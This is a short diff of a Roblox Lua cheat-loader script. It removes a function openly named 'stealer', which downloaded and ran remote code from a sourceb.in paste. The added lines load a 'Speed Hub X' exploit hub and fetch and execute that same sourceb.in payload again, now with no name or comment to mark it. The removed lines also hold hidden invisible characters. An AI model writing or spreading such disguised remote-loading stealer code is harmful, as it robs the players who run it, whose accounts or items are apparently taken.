@@ -1,10 +1,2 @@
-local function stealer()
-‎    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/GKyo4b8tAV/0'))() -- replace with actual stealer
-‎end
-‎local function loadui()
-‎  loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
-‎
-‎end
-‎
-‎task.spawn(stealer)
-‎task.spawn(loadui)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/GKyo4b8tAV/0", true))()
